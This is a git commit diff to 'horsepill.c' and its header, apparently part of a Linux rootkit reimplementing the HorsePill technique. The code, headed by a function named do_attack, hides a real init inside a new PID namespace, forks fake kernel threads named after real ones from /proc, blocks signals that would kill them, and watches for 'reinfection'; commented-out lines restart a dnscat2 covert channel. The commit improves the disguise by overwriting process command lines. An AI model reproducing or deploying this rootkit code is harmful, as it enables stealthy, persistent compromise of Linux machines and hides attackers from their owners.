f4318809b74669a268d62db74f793fb69a23dc8b
cristiano-u08 <cristia_no98@live.it>
2022-04-29 23:16:08 +0200

    Fixed construction of fake kernel threads

--- horsepill.c
+++ horsepill.c
@@ -48,108 +48,110 @@
 #define ptr_to_u64(ptr) ((__u64)((uintptr_t)(ptr)))
 
 static pid_t init_pid;
+char **cmdline_ptr;
 
 extern pid_t __clone(int, void *);
 
 static inline int raw_clone(unsigned long flags, void *child_stack) {
-	return __clone(flags, child_stack);
+        return __clone(flags, child_stack);
 }
 
-static void set_prctl_name(char *name)
+static void set_process_name(char *name)
 {
-	char buf[2048];
+        char buf[2048];
 
-	memset((void*)buf, 0, sizeof(buf));
-	strncpy(buf, name+1, strlen(name)-2);
-	if (prctl(PR_SET_NAME, (unsigned long)buf, 0, 0, 0) < 0) {
-		printf("prctl set name returned error!\n");
-		exit(EXIT_FAILURE);
-	}
+        memset((void*)buf, 0, sizeof(buf));
+        strncpy(buf, name + 1, strlen(name) - 2);
+        if (prctl(PR_SET_NAME, (unsigned long)buf, 0, 0, 0) < 0) {
+                printf("prctl set name returned error!\n");
+                exit(EXIT_FAILURE);
+        }
+        memset((void *)cmdline_ptr[0], 0, 32);
+        strcpy(cmdline_ptr[0], name);
 }
 
 static void make_fake_kthreads(char **threads)
 {
-	int i;
-	sigset_t set;
+        int i;
+        sigset_t set;
 
-	if (fork() == 0) {
-		/* special case for pid 2 (kthreadd) */
+        if (fork() == 0) {
+                /* special case for pid 2 (kthreadd) */
 
-		/* block all signals which can terminate
-		 * the fake kernel threads
-		 */
-		G3LBIN(sigfillset(&set));
-		G3LBIN(sigprocmask(SIG_BLOCK, &set, NULL));
+                /* block all signals which can terminate
+                 * the fake kernel threads
+                 */
+                G3LBIN(sigfillset(&set));
+                G3LBIN(sigprocmask(SIG_BLOCK, &set, NULL));
 
-		set_prctl_name(threads[0]);
-		for (i = 1; threads[i]; i++) {
-			if (fork() == 0) {
-				/* all other kernel threads are
-				 * children of pid 2
-				 */
-				set_prctl_name(threads[i]);
-				while(1) {
-					pause();
-				}
-				exit(EXIT_FAILURE); /* should never
-						     * reach here */
-			}
-		}
-		while(1) {
-			pause();
-		}
-		exit(EXIT_FAILURE); /* should never reach here */
-	}
+                set_process_name(threads[0]);
+                for (i = 1; threads[i]; i++) {
+                        if (fork() == 0) {
+                                /* all other kernel threads are
+                                 * children of pid 2
+                                 */
+                                set_process_name(threads[i]);
+                                while(1) {
+                                        pause();
+                                }
+                                exit(EXIT_FAILURE); /* should never
+                                                     * reach here */
+                        }
+                }
+                while(1) {
+                        pause();
+                }
+                exit(EXIT_FAILURE); /* should never reach here */
+        }
 }
 
 static int is_proc(char *name)
 {
-	int i;
-	for (i = 0; i < strlen(name); i++) {
-		if (!isdigit(name[i])) {
-			return 0;
-		}
-	}
-	return 1;
+        int i;
+        for (i = 0; i < strlen(name); i++) {
+                if (!isdigit(name[i]))
+                        return 0;
+        }
+        return 1;
 }
 
 static char *grab_kernel_thread(char *name)
 {
-	FILE *stat;
-	char buf[4096];
+        FILE *stat;
+        char buf[4096];
 
-	int pid;
-	char pidname[4096];
-	char newpidname[4096];
-	char state;
-	int ppid;
+        int pid;
+        char pidname[4096];
+        char newpidname[4096];
+        char state;
+        int ppid;
 
-	char *ret = NULL;
+        char *ret = NULL;
 
-	memset((void*)newpidname, 0, sizeof(newpidname));
-	snprintf(buf, sizeof(buf) - 1, "/proc/%s/stat", name);
-	stat = fopen(buf, "r");
-	if (stat == NULL) {
-		printf("couldn't open /proc/%s/stat\n", name);
-		goto out;
-	}
-	fgets(buf, sizeof(buf) - 1, stat);
-	sscanf(buf, "%d %s %c %d", &pid, pidname, &state, &ppid);
-	if (pid != 1 && (ppid == 0 || ppid == 2)) {
-		for (unsigned int i = 0; i <= strlen(pidname); i++) {
-			char c = pidname[i];
-			if (c == '(') {
-				c = '[';
-			} else if (c == ')') {
-				c = ']';
-			}
-			newpidname[i] = c;
-		}
-		ret = strdup(newpidname);
-	}
-	fclose(stat);
+        memset((void*)newpidname, 0, sizeof(newpidname));
+        snprintf(buf, sizeof(buf) - 1, "/proc/%s/stat", name);
+        stat = fopen(buf, "r");
+        if (stat == NULL) {
+                printf("couldn't open /proc/%s/stat\n", name);
+                goto out;
+        }
+        fgets(buf, sizeof(buf) - 1, stat);
+        sscanf(buf, "%d %s %c %d", &pid, pidname, &state, &ppid);
+        if (pid != 1 && (ppid == 0 || ppid == 2)) {
+                for (unsigned int i = 0; i <= strlen(pidname); i++) {
+                        char c = pidname[i];
+                        if (c == '(') {
+                                c = '[';
+                        } else if (c == ')') {
+                                c = ']';
+                        }
+                        newpidname[i] = c;
+                }
+                ret = strdup(newpidname);
+        }
+        fclose(stat);
 out:
-	return ret;
+        return ret;
 }
 
 /**
@@ -164,65 +166,64 @@ out:
  */
 static int enumerate_kernel_threads(char **threads)
 {
-	DIR *dirp;
-	int i = 0;
-	struct dirent *dp;
+        DIR *dirp;
+        int i = 0;
+        struct dirent *dp;
 
-	if ((dirp = opendir("/proc")) == NULL)
+        if ((dirp = opendir("/proc")) == NULL)
                 err_exit("couldn't open '/proc'");
 
-	do {
-		errno = 0;
-		if ((dp = readdir(dirp)) != NULL) {
-			if (dp->d_type == DT_DIR && is_proc(dp->d_name)) {
-				char *name = grab_kernel_thread(dp->d_name);
-				if (name) {
-					threads[i] = name;
-					i++;
-				}
-			}
-		}
-	} while (dp != NULL);
+        do {
+                errno = 0;
+                if ((dp = readdir(dirp)) != NULL) {
+                        if (dp->d_type == DT_DIR && is_proc(dp->d_name)) {
+                                char *name = grab_kernel_thread(dp->d_name);
+                                if (name) {
+                                        threads[i] = name;
+                                        i++;
+                                }
+                        }
+                }
+        } while (dp != NULL);
 
-	if (errno != 0)
+        if (errno != 0)
                 err_exit("error reading directory");
-	G3LBIN(closedir(dirp));
+        G3LBIN(closedir(dirp));
         return i;
 }
 
 static void on_sigint(int signum)
 {
-	if (signum == SIGINT) {
-		kill(init_pid, SIGINT);
-	}
+        if (signum == SIGINT)
+                kill(init_pid, SIGINT);
 }
 
 static void handle_init_exit(int wstatus)
 {
-	char msg[128];
+        char msg[128];
 
-	if (WIFSIGNALED(wstatus)) {
-		int signum = WTERMSIG(wstatus);
+        if (WIFSIGNALED(wstatus)) {
+                int signum = WTERMSIG(wstatus);
 
-		if (signum == SIGHUP) {
-			/* The system must be restarted */
-			G3LBIN(reboot(LINUX_REBOOT_CMD_RESTART, NULL));
-			snprintf(msg, 14, "cannot reboot");
-		} else if (signum == SIGINT) {
-			/* The system must be turned off */
-			G3LBIN(reboot(LINUX_REBOOT_CMD_POWER_OFF, NULL));
-			snprintf(msg, 16, "cannot shutdown");
-		} else {
-			snprintf(msg, 47,
-				 "init exited via signal %d for unknown reason...",
-				 signum);
-		}
-	} else {
-		snprintf(msg, 48,
-			 "init exited with status %d for unknown reason...",
-		       	 WEXITSTATUS(wstatus));
-	}
-	err_exit(msg);
+                if (signum == SIGHUP) {
+                        /* The system must be restarted */
+                        G3LBIN(reboot(LINUX_REBOOT_CMD_RESTART, NULL));
+                        snprintf(msg, 14, "cannot reboot");
+                } else if (signum == SIGINT) {
+                        /* The system must be turned off */
+                        G3LBIN(reboot(LINUX_REBOOT_CMD_POWER_OFF, NULL));
+                        snprintf(msg, 16, "cannot shutdown");
+                } else {
+                        snprintf(msg, 47,
+                                 "init exited via signal %d for unknown reason...",
+                                 signum);
+                }
+        } else {
+                snprintf(msg, 48,
+                         "init exited with status %d for unknown reason...",
+                         WEXITSTATUS(wstatus));
+        }
+        err_exit(msg);
 }
 
 void do_attack()
@@ -246,46 +247,43 @@ void do_attack()
                         err_exit("Cannot remount '/proc'");
 
                 make_fake_kthreads(kthreads_names);
-		sleep(5);	/* wait for completion */
-		for (i = 0; i < num; i++) {
-                        free(kthreads_names[i]);
-                }
+                sleep(5);	/* wait for completion */
         } else {
                 /* Parent process */
 
-		/* install signal handler to handle signal delivered
-		 * ctrl-alt-delete, which we will send to child init
-		 */
-		if (signal(SIGINT, on_sigint) == SIG_ERR)
-			err_exit("couldn't install signal handler");
-		if (reboot(LINUX_REBOOT_CMD_CAD_OFF, NULL) < 0)
-			err_exit("couldn't turn cad off");
+                /* install signal handler to handle signal delivered
+                 * ctrl-alt-delete, which we will send to child init
+                 */
+                if (signal(SIGINT, on_sigint) == SIG_ERR)
+                        err_exit("couldn't install signal handler");
+                if (reboot(LINUX_REBOOT_CMD_CAD_OFF, NULL) < 0)
+                        err_exit("couldn't turn cad off");
 
-		/* watching for dnscat exit
-		 * also, watching for reinfection
-		 * also, waitpid for init
-		 */
-		while(1) {
-			int wstatus;
-			pid_t pid;
+                /* watching for dnscat exit
+                 * also, watching for reinfection
+                 * also, waitpid for init
+                 */
+                while(1) {
+                        int wstatus;
+                        pid_t pid;
 
-			pid = waitpid(-1, &wstatus, 0);
-			if (pid < 0) {
-				if (errno != EINTR) {
-					err_exit("watipid returned error!");
-				} else {
-					/* interrupted via signal */
-					continue;
-				}
-			} else if (pid == init_pid) {
-				handle_init_exit(wstatus);
-			// } else if (pid == dnscat_pid) {
- 			// 	dnscat_pid = run_dnscat2();
-			} else {
-				printf("unknown other pid %d exited\n", pid);
-			}
-			sleep(1);
-		}
+                        pid = waitpid(-1, &wstatus, 0);
+                        if (pid < 0) {
+                                if (errno != EINTR) {
+                                        err_exit("watipid returned error!");
+                                } else {
+                                        /* interrupted via signal */
+                                        continue;
+                                }
+                        } else if (pid == init_pid) {
+                                handle_init_exit(wstatus);
+                        // } else if (pid == dnscat_pid) {
+                         // 	dnscat_pid = run_dnscat2();
+                        } else {
+                                printf("unknown other pid %d exited\n", pid);
+                        }
+                        sleep(1);
+                }
         }
 }
 
--- horsepill.h
+++ horsepill.h
@@ -1,6 +1,8 @@
 #ifndef HORSEPILL_H
 #define HORSEPILL_H
 
+extern char **cmdline_ptr;
+
 void do_attack();
 
 #endif
